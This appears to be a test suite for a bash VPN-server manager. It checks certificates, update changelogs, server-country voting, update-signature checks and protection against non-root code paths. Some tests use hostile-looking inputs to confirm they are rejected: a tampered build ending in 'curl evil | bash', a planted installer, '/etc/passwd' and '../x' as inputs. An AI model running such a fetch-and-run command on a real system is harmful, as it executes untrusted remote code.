    r.get("ok") and r["data"] == {"port": "8443", "url": "https://203.0.113.10:8443/"}, r)
r = api("bot", "webapp", "port", "80")
chk("порт 80 под Mini App не отдаётся — он для сертификата", not r.get("ok"), r)
r = api("bot", "webapp", "port", "443")
chk("порт 443 — адрес без номера порта",
    r.get("ok") and api("bot", "webapp", "get")["data"]["url"] == "https://203.0.113.10/", r)
with open(os.path.join(ROOT, "bot.conf")) as f:
    chk("порт записан в конфиг бота, токен не тронут", "WEBAPP_PORT=443" in f.read())
os.remove(os.path.join(ROOT, "bot.conf"))

reset_calls()
r = api("cert", "remove")
chk("удаление: acme.sh забывает адрес, файлы и таймер убраны",
    r.get("ok") and not os.path.exists(CERT) and "--remove -d 203.0.113.10" in calls()
    and not os.path.exists(os.path.join(ROOT, "var/lib/awg2/cert")), [r, calls()[-300:]])

# Готовый сертификат сервера (порт 80 занят Caddy): тестовый CA и сертификат
# на IP сервера в каталоге Caddy, рядом — самоподписанный и с чужим ключом
print("Готовые сертификаты")
CA = os.path.join(TMP, "ca")
CADDY = os.path.join(ROOT, "var/lib/caddy/.local/share/caddy/certificates/acme/203.0.113.10")
SELF = os.path.join(ROOT, "etc/letsencrypt/live/self")
BADK = os.path.join(ROOT, "root/cert/bad")
for d in (CA, CADDY, SELF, BADK):
    os.makedirs(d, exist_ok=True)
EC = ["-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:P-256", "-nodes"]
def ossl(*a):
    subprocess.run(["openssl", *a], check=True, capture_output=True, cwd=CA)
ossl("req", "-x509", *EC, "-keyout", "ca.key", "-out", "ca.crt", "-days", "30", "-subj", "/CN=Test CA")
ossl("req", *EC, "-keyout", f"{CADDY}/203.0.113.10.key", "-out", "leaf.csr", "-subj", "/CN=203.0.113.10")
with open(os.path.join(CA, "ext"), "w") as f:
    f.write("subjectAltName=IP:203.0.113.10\n")
ossl("x509", "-req", "-in", "leaf.csr", "-CA", "ca.crt", "-CAkey", "ca.key", "-CAcreateserial",
     "-out", f"{CADDY}/203.0.113.10.crt", "-days", "20", "-extfile", "ext")
ossl("req", "-x509", *EC, "-keyout", f"{SELF}/privkey.pem", "-out", f"{SELF}/fullchain.pem", "-days", "20",
     "-subj", "/CN=203.0.113.10", "-addext", "subjectAltName=IP:203.0.113.10")
shutil.copy(f"{CADDY}/203.0.113.10.crt", f"{BADK}/fullchain.pem")
ossl("genpkey", "-algorithm", "EC", "-pkeyopt", "ec_paramgen_curve:P-256", "-out", f"{BADK}/privkey.pem")
CADDY_CRT = f"{CADDY}/203.0.113.10.crt"
r = api("cert", "find")
rows = r.get("data") or []
chk("находит сертификат Caddy, самоподписанный и с чужим ключом — мимо",
    r.get("ok") and [(x["name"], x["source"], x["cert"]) for x in rows] == [("203.0.113.10", "Caddy", CADDY_CRT)], r)
r = api("cert", "use", "/etc/passwd")
chk("подключается только найденный, не любой путь", not r.get("ok") and "нет" in (r.get("error") or ""), r)
r = api("cert", "use", CADDY_CRT)
st = api("cert", "status").get("data") or {}
chk("готовый подключён ссылкой, продлевает Caddy", r.get("ok") and os.path.islink(CERT)
    and os.path.realpath(CERT) == os.path.realpath(CADDY_CRT) and st.get("kind") == "external"
    and st.get("source") == "Caddy" and st.get("installed") and st.get("name") == "203.0.113.10"
    and not os.path.exists(os.path.join(ROOT, "units", "awg2-cert.timer.disabled")), [r, st])
r = api("cert", "remove")
chk("удаление готового: свои ссылки убраны, файлы Caddy целы", r.get("ok") and not os.path.lexists(CERT)
    and os.path.exists(CADDY_CRT) and os.path.exists(f"{CADDY}/203.0.113.10.key"), r)

BUSY = os.path.join(TMP, "busy80")
os.makedirs(BUSY, exist_ok=True)
with open(os.path.join(BUSY, "ss"), "w") as f:
    f.write('#!/usr/bin/env bash\n[[ "$*" == *":80"* ]] && echo \'LISTEN 0 4096 *:80 *:* users:(("caddy",pid=1,fd=3))\'\nexit 0\n')
os.chmod(os.path.join(BUSY, "ss"), 0o755)
r = api("cert", "issue", "ip", env={"PATH": BUSY + ":" + ENV["PATH"]})
chk("порт 80 занят — отказ с подсказкой про готовый сертификат", not r.get("ok") and "занят (caddy)" in (r.get("error") or "")
    and "готовые сертификаты (1)" in r.get("log", ""), r)
st = api("cert", "status", env={"PATH": BUSY + ":" + ENV["PATH"]}).get("data") or {}
chk("статус: кто держит порт 80 и сколько готовых", st.get("port80") == "caddy" and st.get("found") == 1, st)

print("Список изменений")
MD = ("# Изменения\n\n---\n\n## v1.2.0 — 2026-11-01\n\n- новое **важное**\n  продолжение\n\n---\n\n"
      "## v1.1.1 — 2026-10-01\n\n- исправление\n\n---\n\n## v1.1.0 — 2026-10-01 (бот 3.1.0)\n\n- панель\n")
rc, out, _ = bash("py changelog-json v1.1.0", stdin=MD)
d = json.loads(out) if rc == 0 else {}
chk("изменения новее установленной, сверху новейшая", d.get("newer") is True
    and [x["version"] for x in d.get("sections", [])] == ["v1.2.0", "v1.1.1"]
    and d["sections"][0]["title"] == "2026-11-01" and d["sections"][0]["body"].endswith("продолжение"), d)
rc, out, _ = bash("py changelog-json v1.2.0", stdin=MD)
d = json.loads(out) if rc == 0 else {}
chk("новее нет — раздел текущей версии", d.get("newer") is False
    and [x["version"] for x in d.get("sections", [])] == ["v1.2.0"], d)
r = api("update", "changelog")
chk("нет связи с GitHub — понятная ошибка", not r.get("ok") and "недоступен" in (r.get("error") or ""), r)
# Кэш проверки отстал (живёт до часа), а в CHANGELOG канала уже новее — «Доступна»
# и кнопка в панели показали бы прошлую версию: awg2 спрашивает канал сразу
CLBIN = os.path.join(TMP, "clbin")
os.makedirs(CLBIN, exist_ok=True)
with open(os.path.join(CLBIN, "curl"), "w") as f:
    f.write('#!/usr/bin/env bash\nurl="${@: -1}"; echo "curl $url" >> "$CALLS"\ncase "$url" in\n'
            '  *CHANGELOG.md*) printf "# Изменения\\n\\n## v9.1.0 — 2026-11-01\\n\\n- новое\\n\\n## v9.0.0 — 2026-10-01\\n\\n- старое\\n" ;;\n'
            '  *awg2.sh*) printf "#!/bin/bash\\nVERSION=\\"v9.1.0\\"\\n" ;;\n  *) exit 22 ;;\nesac\n')
os.chmod(os.path.join(CLBIN, "curl"), 0o755)
for name in ("update_check", "update_check.beta"):
    with open(os.path.join(ROOT, "var/lib/awg2", name), "w") as f:
        f.write(f"v9.0.0 {int(time.time())}\n")
reset_calls()
r = api("update", "changelog", env={"PATH": CLBIN + ":" + ENV["PATH"]})
d = r.get("data") or {}
chk("кэш проверки отстал от CHANGELOG — канал спрошен сразу, «Доступна» — новейшая",
    r.get("ok") and d.get("available") == "v9.1.0" and d["sections"][0]["version"] == "v9.1.0"
    and "awg2.sh" in calls(), [r, calls()])
reset_calls()
r = api("update", "changelog", env={"PATH": CLBIN + ":" + ENV["PATH"]})
chk("кэш свежий — второй раз канал не спрашивается", r.get("ok") and (r.get("data") or {}).get("available") == "v9.1.0"
    and "awg2.sh" not in calls() and "CHANGELOG.md" in calls(), [r, calls()])
for name in ("update_check", "update_check.beta"):
    os.remove(os.path.join(ROOT, "var/lib/awg2", name))

print("Мимикрия как у сервера")
with open(conf, "w") as f:
    f.write(OLD20.replace("# AWG_MIMICRY=quic", "# AWG_MIMICRY=dns\n# AWG_MIMICRY_DOMAIN=example.com\n# AWG_OBF_LEVEL=2"))
def i_lines(name):
    t = (api("client", "conf", name).get("data") or {}).get("text", "")
    return sorted(set(re.findall(r"^(I[1-5]) =", t, re.M)))
api("client", "add", "m_srv", "mimicry=server")
api("client", "add", "m_srv3", "mimicry=server:3")
chk("«как у сервера» — уровень сервера (только I1)", i_lines("m_srv") == ["I1"], i_lines("m_srv"))
chk("«как у сервера» с уровнем 3 — цепочка того же профиля", i_lines("m_srv3") == ["I1", "I2", "I3", "I4", "I5"],
    i_lines("m_srv3"))

print("Ядро без модуля")
KG = ('MOD_SRC_DIR="$STATE_DIR/modsrc"; mkdir -p "$MOD_SRC_DIR"; dkms() { :; }; uname() { echo 6.8.0-100-generic; }; '
      'installed_kernels() { printf "%s\\n" 6.8.0-90-generic 6.8.0-100-generic 6.8.0-110-generic; }; '
      'mod_loaded() { true; }; ')
rc, out, _ = bash(KG + 'mod_built_for() { [[ $1 == 6.8.0-100-generic ]]; }; kernel_gap; echo "--"; kernel_gap_line')
chk("новое ядро без модуля — в списке, старое — нет", out == "6.8.0-110-generic нет-заголовков\n--\n6.8.0-110-generic (нет заголовков)\n", out)
rc, out, _ = bash(KG + 'mod_built_for() { true; }; kernel_gap; echo "[$(kernel_gap_line)]"')
chk("модуль собран под все ядра — пусто", out == "[]\n", out)
# Сборка в памяти и исходники: исходники новее .ko — «прежняя сборка», старше или их нет — нет
MS = ('MOD_SRC_DIR="$STATE_DIR/modsrc2"; mkdir -p "$MOD_SRC_DIR"; mod_loaded() { true; }; '
      'KO="$STATE_DIR/fake.ko"; touch -d "2026-01-02" "$KO"; '
      'modinfo() { [[ $1 == -n ]] && echo "$KO"; return 0; }; ')
rc, out, _ = bash(MS + 'mod_stale && echo stale || echo fresh; touch -d "2026-01-01" "$MOD_SRC_DIR/a.c" "$MOD_SRC_DIR/b.h"; '
                  'mod_stale && echo stale || echo fresh; touch -d "2026-01-03" "$MOD_SRC_DIR/b.h"; mod_stale && echo stale || echo fresh')
chk("mod_stale: исходников нет / старше .ko / один новее .ko", out == "fresh\nfresh\nstale\n", out)
rc, out, _ = bash(KG + 'mod_built_for() { true; }; mod_stale() { false; }; reboot_reason; components_summary')
chk("новое ядро — коротко: номер без «-generic» и «нужна перезагрузка» (и в шапке меню)",
    out.splitlines()[0] == "новое ядро 6.8.0-110 — нужна перезагрузка" and "▲ новое ядро 6.8.0-110 — нужна перезагрузка" in out, out)
rc, out, _ = bash(KG + 'mod_built_for() { [[ $1 == 6.8.0-100-generic ]]; }; components_summary')
chk("шапка меню предупреждает о ядре без модуля", "6.8.0-110-generic" in out and "Пересобрать" in out, out)
rc, out, _ = bash(KG + 'mod_built_for() { false; }; mod_loaded() { false; }; components_summary')
chk("шапка: и работающее ядро без модуля не прячет более новое", "ядро 6.8.0-110-generic" in out
    and "6.8.0-100-generic," not in out, out)
chk("шапка: …и про работающее ядро без модуля тоже сказано", "работающее ядро 6.8.0-100-generic" in out, out)
rc, out, _ = bash(KG + 'uname() { echo 6.8.0-1; }; installed_kernels() { printf "%s\\n" 6.8.0-1 6.8.0-10; }; '
                  'mod_built_for() { [[ $1 == 6.8.0-1 ]]; }; components_summary')
chk("шапка: 6.8.0-10 без модуля при работающем 6.8.0-1 — не префикс", "ядро 6.8.0-10" in out, out)
r = api("status")
chk("api status: components.kernel_gap", r.get("ok") and "kernel_gap" in (r["data"].get("components") or {}), r.get("data"))
chk("api status: uptime — секунды работы системы", isinstance(r["data"].get("uptime"), int) and r["data"]["uptime"] > 0, r.get("data"))

print("Страна сервера — флаг в шапке панели")
rc, out, _ = bash('curl() { printf "fl=1\\nip=203.0.113.10\\nloc=NL\\nwarp=off\\n"; }; country_refresh; cat "$COUNTRY_CACHE"; server_country')
o = out.split()
chk("страна — из ответов сервисов (loc=NL у всех), в кэш со временем, версией формата и голосами",
    len(o) == 5 and o[0] == "NL" and o[1].isdigit() and o[2] == "2" and o[3].startswith("NL=") and o[4] == "NL", out)
r = api("status")
chk("api status: country — код страны из кэша", (r.get("data") or {}).get("country") == "NL", r.get("data"))
rc, out, _ = bash('rm -f "$COUNTRY_CACHE"; curl() { return 28; }; country_refresh; cat "$COUNTRY_CACHE"; echo "[$(server_country)]"')
chk("ни один сервис не ответил — пометка «-», страна пустая (флага нет)", out.split()[0] == "-" and out.strip().endswith("[]"), out)
# Один сбой не стирает уже известную страну (флаг не пропадает на час); метка такая, что повтор — через час
rc, out, _ = bash('echo "NL $(( $(date +%s) - 90000 ))" > "$COUNTRY_CACHE"; curl() { return 28; }; country_refresh; '
                  'read -r cc ts _ < "$COUNTRY_CACHE"; echo "$cc $(( $(date +%s) - ts )) [$(server_country)]"')
o = out.split()
chk("сервисы не ответили, а страна уже известна — остаётся, повтор через час (не через сутки)",
    len(o) == 3 and o[0] == "NL" and o[2] == "[NL]" and o[1].isdigit() and 82700 <= int(o[1]) <= 82900, out)
rc, out, _ = bash('rm -f "$COUNTRY_CACHE"; curl() { printf "loc=XX\\n"; }; country_refresh; echo "[$(server_country)]"; '
                  'printf "<b>\\n" > "$COUNTRY_CACHE"; echo "[$(server_country)]"')
chk("неизвестная страна (XX) и мусор в кэше — без флага", out.split() == ["[]", "[]"], out)
CR = 'country_refresh() { touch "$STATE_DIR/cr"; }; rm -f "$STATE_DIR/cr"; unset AWG_NO_UPDATE_CHECK; '
for cache, age, want, what in (("NL", 3600, False, "узнали час назад — не спрашивает"),
                               ("NL", 90000, True, "узнали больше суток назад — спрашивает"),
                               ("-", 600, False, "не узнали 10 мин назад — ждёт"),
                               ("-", 3700, True, "не узнали больше часа назад — спрашивает снова")):
    rc, out, _ = bash(CR + f'echo "{cache} $(( $(date +%s) - {age} )) 2" > "$COUNTRY_CACHE"; country_refresh_async; sleep 0.3; '
                      '[[ -e "$STATE_DIR/cr" ]] && echo ASK || echo SKIP')
    chk(f"страна: {what}", out.strip().endswith("ASK" if want else "SKIP"), out)
rc, out, _ = bash(CR + 'echo "NL $(( $(date +%s) - 3600 ))" > "$COUNTRY_CACHE"; country_refresh_async; sleep 0.3; '
                  '[[ -e "$STATE_DIR/cr" ]] && echo ASK || echo SKIP')
chk("страна: кэш прежнего формата (один сервис) — пересчитывается сразу, а не через сутки", out.strip().endswith("ASK"), out)
rc, out, err = bash(CR + 'rm -f "$COUNTRY_CACHE"; country_refresh_async; sleep 0.3; [[ -e "$STATE_DIR/cr" ]] && echo ASK || echo SKIP')
chk("страна: кэша ещё нет — спрашивает, без ошибок в stderr", out.strip().endswith("ASK") and not err.strip(), [out, err])
rc, out, _ = bash('AWG_NO_UPDATE_CHECK=1; country_refresh() { touch "$STATE_DIR/cr"; }; rm -f "$STATE_DIR/cr" "$COUNTRY_CACHE"; '
                  'country_refresh_async; sleep 0.3; [[ -e "$STATE_DIR/cr" ]] && echo ASK || echo SKIP')
chk("страна: в тестах и без сети (AWG_NO_UPDATE_CHECK) — не спрашивает", out.strip().endswith("SKIP"), out)

print("Страна сервера — несколько сервисов, побеждает большинство")
import shlex


def cstub(**ans):
    """curl, отвечающий по имени сервиса: текст — ответ, None — сбой, нет ключа — сбой."""
    arms = []
    for key, pat in (("cloudflare", "*cloudflare*"), ("ipinfo", "*ipinfo*"), ("ipapi", "*ipapi*"), ("countryis", "*country.is*"),
                     ("geojs", "*geojs*"), ("ipwhois", "*ipwho.is*"), ("ifconfig", "*ifconfig*")):
        body = ans.get(key)
        arms.append(f"{pat}) " + ("return 22" if body is None else f"printf '%s\\n' {shlex.quote(body)}") + " ;;")
    return ('curl() { local u="${@: -1}"; echo "$u" >> "$STATE_DIR/curl-urls"; ' + ans.get("_pre", "") + 'case "$u" in '
            + " ".join(arms) + " *) return 22 ;; esac; }; ")


CRF = 'rm -f "$COUNTRY_CACHE" "$STATE_DIR/curl-urls"; country_refresh; cat "$COUNTRY_CACHE"'
# Хостер из Нидерландов, база Cloudflare и ещё одного сервиса говорят «Германия»
rc, out, _ = bash(cstub(cloudflare="fl=1\nloc=DE\nwarp=off", ipinfo="NL", ipapi="NL", countryis='{"ip":"203.0.113.10","country":"NL"}',
                        geojs='[{"name":"Netherlands","country":"NL"}]', ipwhois='{"country_code":"DE"}') + CRF)
chk("DE у двух сервисов, NL у четырёх — берётся большинство (NL), голоса в кэше", out.split()[0] == "NL" and out.split()[3] == "NL=4,DE=2", out)
# Равенство: побеждает тот, кто встретился раньше (Cloudflare — первый в списке)
rc, out, _ = bash(cstub(cloudflare="loc=DE", ipinfo="NL", ipapi="NL", countryis='{"country":"DE"}') + CRF)
chk("два против двух — выше в списке (Cloudflare): DE", out.split()[0] == "DE", out)
rc, out, _ = bash(cstub(ipinfo="NL", ipapi="DE", countryis='{"country":"DE"}', geojs='[{"country":"NL"}]') + CRF)
chk("два против двух без Cloudflare — тот, кто встретился раньше: NL", out.split()[0] == "NL", out)
# Один ответ — берётся он (лучше, чем без флага)
rc, out, _ = bash(cstub(ipinfo="AT") + CRF)
chk("ответил один сервис — страна от него", out.split()[0] == "AT", out)
# Все разные: большинства нет — известная страна не меняется, а неизвестная берётся по порядку
rc, out, _ = bash(cstub(cloudflare="loc=DE", ipinfo="NL", ipapi="FR") + 'echo "AT $(( $(date +%s) - 90000 )) 2" > "$COUNTRY_CACHE"; country_refresh; '
                  'read -r cc ts _ < "$COUNTRY_CACHE"; echo "$cc $(( $(date +%s) - ts ))"')
o = out.split()
chk("все сервисы разошлись — прежняя страна остаётся, повтор через час", o[0] == "AT" and 82700 <= int(o[1]) <= 82900, out)
rc, out, _ = bash(cstub(cloudflare="loc=DE", ipinfo="NL", ipapi="FR") + CRF)
chk("все разошлись, страны ещё нет — берётся по порядку списка (Cloudflare)", out.split()[0] == "DE", out)
# Мусор и «не страна» не считаются голосами
rc, out, _ = bash(cstub(cloudflare="loc=XX", ipinfo="Too many requests", ipapi="<html><body>429</body></html>", countryis='{"error":"rate limit"}',
                        geojs='[{"name":"Austria","country":"AT"}]', ipwhois='{"success":false,"country_code":"EU"}', ifconfig="at") + CRF)
chk("XX, EU, ошибки и HTML — не голоса; остальные (AT, at) — страна AT", out.split()[0] == "AT" and out.split()[3] == "AT=2", out)
rc, out, _ = bash(cstub(ipinfo="UK", ipapi="GB") + CRF)
chk("UK и GB — одна страна (GB)", out.split()[0] == "GB" and out.split()[3] == "GB=2", out)
# Все спрашивают про один адрес сервера; без адреса — запросы без него, сервис «только по адресу» пропускается
rc, out, _ = bash(cstub(ipinfo="NL", ipapi="NL") + CRF + '; cat "$STATE_DIR/curl-urls"')
chk("в запросы подставлен адрес сервера", "https://ipinfo.io/203.0.113.10/country" in out and "https://ipwho.is/203.0.113.10?fields=country_code" in out
    and "{IP}" not in out and "https://cloudflare.com/cdn-cgi/trace" in out, out)
rc, out, _ = bash("public_ip_cached() { :; }; " + cstub(ipinfo="NL", ipapi="NL") + CRF + '; cat "$STATE_DIR/curl-urls"')
chk("адрес сервера неизвестен — запросы без него, ipwho.is пропущен", "https://ipinfo.io/country" in out and "ipwho.is" not in out
    and "{IP}" not in out and out.split()[0] == "NL", out)
# Сервисы опрашиваются одновременно: семь по секунде — не семь секунд
rc, out, _ = bash(cstub(cloudflare="loc=NL", ipinfo="NL", ipapi="NL", countryis='{"country":"NL"}', geojs='[{"country":"NL"}]',
                        ipwhois='{"country_code":"NL"}', ifconfig="NL", _pre="sleep 1; ")
                  + 't0=$(date +%s%N); ' + CRF + '; echo "ms=$(( ($(date +%s%N) - t0) / 1000000 ))"')
ms = int(out.split("ms=")[-1])
chk("семь сервисов по секунде отвечают одновременно (<3 с)", out.split()[0] == "NL" and ms < 3000, [out, ms])
# Смена страны — в журнал, с голосами
rc, out, _ = bash(cstub(cloudflare="loc=DE", ipinfo="NL", ipapi="NL") + 'echo "DE $(date +%s) 2" > "$COUNTRY_CACHE"; country_refresh; '
                  'grep -h "страна сервера" "$LOG_FILE" "$AWG_LOG" 2>/dev/null | tail -1; cat "$COUNTRY_CACHE"')
chk("страна сменилась (DE → NL) — кэш обновлён", "NL " in out.split("\n")[-2] + " ", out)
# Временный каталог ответов за собой убирается
rc, out, _ = bash(cstub(ipinfo="NL", ipapi="NL") + CRF + '; ls -d /tmp/awg2.country.* 2>/dev/null | wc -l')
chk("временные файлы ответов убраны", out.strip().endswith("0"), out)

print("Страна сервера вручную — главнее геосервисов")
bash('rm -f "$COUNTRY_MANUAL"; echo "NL $(date +%s) 2 NL=4,DE=2" > "$COUNTRY_CACHE"')
r = api("status")
d = r.get("data") or {}
chk("api status: страна по геосервисам, не вручную, голоса", d.get("country") == "NL" and d.get("country_auto") == "NL"
    and d.get("country_manual") is False and d.get("country_votes") == "NL=4,DE=2", d)
r = api("country", "set", "at")
d = (api("status").get("data") or {})
chk("country set at — флаг AT (регистр не важен), геосервисы помнятся отдельно",
    r.get("ok") and d.get("country") == "AT" and d.get("country_manual") is True and d.get("country_auto") == "NL", [r, d])
rc, out, _ = bash('echo "DE $(date +%s) 2 DE=5" > "$COUNTRY_CACHE"; server_country')
chk("ручная страна не перебивается новой проверкой геосервисов", out.strip() == "AT", out)
for bad in ("A1", "AUT", "a-", "../x"):
    r = api("country", "set", bad)
    chk(f"country set {bad!r} — отказ, ручная страна прежняя", not r.get("ok") and (api("status").get("data") or {}).get("country") == "AT", r)
r = api("country", "set", "auto")
d = (api("status").get("data") or {})
chk("country set auto — снова по геосервисам", r.get("ok") and d.get("country") == "DE" and d.get("country_manual") is False, [r, d])
r = api("country")
chk("api country без команды — подсказка, rc 2", not r.get("ok") and r.get("_rc") == 2, r)
bash('rm -f "$COUNTRY_MANUAL" "$COUNTRY_CACHE"')

print("Домен мимикрии по региону")
STUBSCAN = 'scan_domains() { shift; SCAN_OK=("$@"); }; '
rc, out, _ = bash(STUBSCAN + 'SERVER_CONF=/nonexistent; S_REGION=world; MIMICRY=dns; mimicry_pool_domain >/dev/null; '
                  'echo "$CPS_DOMAIN"; printf "%s\\n" "${TLS_DOMAINS[@]}"')
lines = out.split()
chk("мастер, регион «мир» — домен из мировых сайтов", lines and lines[0] in lines[1:], out)
rc, out, _ = bash(STUBSCAN + 'SERVER_CONF=/nonexistent; S_REGION=ru; MIMICRY=dns; mimicry_pool_domain >/dev/null; '
                  'echo "$CPS_DOMAIN"; printf "%s\\n" "${CPS_DOMAINS[@]}"')
lines = out.split()
chk("мастер, регион «Россия» — домен из российских", lines and lines[0] in lines[1:], out)
rc, out, _ = bash(STUBSCAN + 'MIMICRY=dns; choose_cps_domain; echo "D=$CPS_DOMAIN"; printf "%s\\n" "${TLS_DOMAINS[@]}" "${CPS_DOMAINS[@]}"',
                  stdin="\n")
out = re.sub(r"\x1b\[[0-9;]*m", "", out)
dom = re.search(r"D=(\S+)", out)
chk("домен мимикрии: Enter — автоматически из пула", "1 Автоматически" in out and dom and dom.group(1) in out.split()[1:]
    and "Домен (Enter" not in out, out[-500:])
rc, out, _ = bash('MIMICRY=dns; choose_cps_domain; echo "D=$CPS_DOMAIN"', stdin="2\nexample.org\n")
chk("домен мимикрии: 2 — свой", "D=example.org" in out, out[-300:])
rc, out, _ = bash('_choose_mtu 1280; echo "M=$MTU"', stdin="\n")
chk("MTU: 1280 в списке один раз, Enter — рекомендуемый",
    len(re.findall(r"\) 1280", re.sub(r"\x1b\[[0-9;]*m", "", out))) == 1 and "M=1280" in out, out)
rc, out, _ = bash('_choose_mtu 1320; echo "M=$MTU"', stdin="4\n")
chk("MTU: другой рекомендуемый — первым, остальные по порядку", "M=1280" in out and "5)" in re.sub(r"\x1b\[[0-9;]*m", "", out), out)
rc, out, _ = bash('echo "$VERSION_SHOW"')
chk("версия без буквы у обычной сборки", out.strip() == bash('echo "$VERSION"')[1].strip(), out)

print("Подпись обновлений")
# Подпись проверяет ssh-keygen (openssh-client): без него раздел пропускается,
# а не роняет весь набор
if not shutil.which("ssh-keygen"):
    print("  ПРОПУСК: нет ssh-keygen — поставь openssh-client")
else:
    SIG = os.path.join(TMP, "sigsrv")
    SIGBIN = os.path.join(TMP, "sigbin")
    os.makedirs(SIG)
    os.makedirs(SIGBIN)
    # curl, отдающий awg2.sh и awg2.sh.sig «из канала» — файлы из SIG
    with open(os.path.join(SIGBIN, "curl"), "w") as f:
        f.write(r"""#!/usr/bin/env bash
    out="" url=""
    while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; http*) url="$1"; shift ;; *) shift ;; esac; done
    url="${url%%\?*}"; src="$SIGSRV/${url##*/}"
    [[ -f "$src" ]] || exit 22
    if [[ -n "$out" ]]; then cp "$src" "$out"; else cat "$src"; fi
    """)
    os.chmod(os.path.join(SIGBIN, "curl"), 0o755)
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", os.path.join(TMP, "relkey")], check=True)
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "evil", "-f", os.path.join(TMP, "evilkey")], check=True)
    PUB = open(os.path.join(TMP, "relkey.pub")).read().split()
    SIGNERS = f'UPDATE_SIGNERS=("{PUB[0]} {PUB[1]}"); '

    def build(ver, key="relkey", sign=True, tamper=False):
        body = "#!/usr/bin/env bash\nset -uo pipefail\n\nVERSION=\"%s\"\n" % ver + "# заполнитель\n" * 6000 + "echo ok\n"
        path = os.path.join(SIG, "awg2.sh")
        with open(path, "w") as f:
            f.write(body)
        if os.path.exists(path + ".sig"):
            os.remove(path + ".sig")
        if sign:
            subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", os.path.join(TMP, key), "-n", "awg-toolza", path], check=True)
        if tamper:
            with open(path, "a") as f:
                f.write("curl evil | bash\n")

    def fetch(extra="", auto=1):
        env = dict(ENV, PATH=SIGBIN + ":" + ENV["PATH"], SIGSRV=SIG)
        r = subprocess.run(["bash", "-c", PRELUDE + SIGNERS + extra + f"AUTO_MODE={auto}; update_channel_init; update_fetch 2>&1"],
                           input="", capture_output=True, text=True, env=env, timeout=120)
        return r.returncode, r.stdout

    build("v9.9.9")
    rc, out = fetch()
    chk("подписанная сборка ставится", rc == 0 and "Подпись сборки верна" in out, out[-400:])
    build("v9.9.9", tamper=True)
    rc, out = fetch()
    chk("сборка, изменённая после подписи, отклоняется", rc != 0 and "не сходится" in out, out[-400:])
    build("v9.9.9", key="evilkey")
    rc, out = fetch()
    chk("подпись чужим ключом отклоняется", rc != 0 and "не сходится" in out, out[-400:])
    build("v9.9.9", sign=False)
    rc, out = fetch()
    chk("новая сборка без подписи отклоняется", rc != 0 and "нет подписи" in out, out[-400:])
    build("v1.1.9", sign=False)
    rc, out = fetch()
    chk("старая сборка без подписи — не из бота и API", rc != 0 and "только из меню" in out, out[-400:])
    rc, out = fetch(auto=0)
    chk("старая сборка без подписи — из меню только после yes", rc != 0 and "до подписей" in out, out[-400:])
    build("v9.9.9")
    rc, out = fetch(extra="UPDATE_SIGNERS=(); ")
    chk("тестовая сборка без ключа — ставит с предупреждением", rc == 0 and "без ключа релизов" in out, out[-400:])
    rc, out, _ = bash('grep -c "ssh-ed25519 AAAA" <<< "$(declare -p UPDATE_SIGNERS)"')
    chk("в сборку вшит ключ релизов", out.strip() == "1", out)

# Откат из бота и панели не ставится и с force: подпись не привязана к версии
OLDF = os.path.join(TMP, "old-awg2.sh")
with open(OLDF, "w") as f:
    f.write('#!/usr/bin/env bash\nVERSION="v1.0.0"\n')
TGT = os.path.join(TMP, "tgt-awg2")
with open(TGT, "w") as f:
    f.write("current\n")
def rollback(api_mode, force):
    rc, out, err = bash(f'SCRIPT_PATH="{TGT}"; VERSION=v1.2.2; UPDATE_NEW=v1.0.0; UPDATE_FILE="{OLDF}"; '
                        f'API_MODE={api_mode}; update_install {force} 2>&1; echo "rc=$?"')
    return out
out = rollback(1, "force")
chk("откат из API с force — отказ, файл не тронут", "rc=1" in out and "только из меню" in out
    and open(TGT).read() == "current\n", out)
out = rollback(0, "")
chk("откат из меню без force — отказ", "rc=1" in out and open(TGT).read() == "current\n", out)
out = rollback(0, "force")
chk("откат из меню с force (после yes) — ставится", "rc=0" in out and "v1.0.0" in open(TGT).read(), out)

print("\n── Код, который запускается от root, — только из каталогов root ──")
EVIL = os.path.join(TMP, "evil", "awg-toolza-v9")
os.makedirs(os.path.join(EVIL, "awg_bot", "awgbot"))
with open(os.path.join(EVIL, "awg_bot", "awgbot", "__init__.py"), "w") as f:
    f.write('__version__ = "99.0.0"\n')
open(os.path.join(EVIL, "awg_bot", "run.py"), "w").close()
with open(os.path.join(EVIL, "awg-bot-install.sh"), "w") as f:
    f.write("touch " + os.path.join(TMP, "PWNED_BOT") + "\n")
rc, out, _ = bash(f'root_only_path / && echo ROOT-OK; root_only_path "{TMP}" || echo TMP-NO; '
                  f'cd "{EVIL}" && echo "[$(_bot_local_src)]"')
chk("локальный код бота: каталог, куда может писать не только root, не берётся",
    "ROOT-OK" in out and "TMP-NO" in out and "[]" in out, out)
rc, out, _ = bash(f'cd "{EVIL}"; AUTO_MODE=1; BOT_INSTALL_URL=file:///nonexistent; bot_install >/dev/null 2>&1; '
                  f'[[ -e "{TMP}/PWNED_BOT" ]] && echo PWNED || echo SAFE')
chk("установка бота из API (без вопроса) не запускает чужой установщик", "SAFE" in out, out)
open(os.path.join(EVIL, "awg_bot", "awgbot", "web.py"), "w").close()
rc, out, _ = bash(f'cd "{EVIL}"; AUTO_MODE=1; BOT_INSTALL_URL=file:///nonexistent; web_code_install >/dev/null 2>&1; '
                  f'[[ -e "{TMP}/PWNED_BOT" ]] && echo PWNED || echo SAFE')
chk("код веб-панели не берётся из чужого каталога (там даже вопроса нет)", "SAFE" in out, out)
LINKED = os.path.join(TMP, "evil", "link-toolza")
os.symlink(EVIL, LINKED)
rc, out, _ = bash(f'BASH_ARGV0=/nonexistent/awg2; root_only_tree() {{ return 0; }}; root_only_path() {{ return 0; }}; '
                  f'cd "{LINKED}" && echo "[$(_bot_local_src)]"')
chk("локальный код бота — по настоящему пути, не через ссылку (её подменили бы после проверки)",
    f"[{os.path.realpath(EVIL)}/awg_bot]" in out and "link-toolza" not in out, out)
rc, out, _ = bash(f"""eval "$(sed -n '/^root_only() {{/,/^}}/p' "{HERE}/../awg-bot-install.sh")"; """
                  f'declare -F root_only >/dev/null || echo MISSING; root_only "{EVIL}/awg_bot" || echo NO; '
                  "root_only /tmp || echo TMP-NO; grep -cF 'root_only \"$SRC\"' \"" + HERE + "/../awg-bot-install.sh\"")
chk("установщик: awg_bot/ рядом с ним в /tmp или чужом каталоге не берётся", out.split() == ["NO", "TMP-NO", "1"], out)
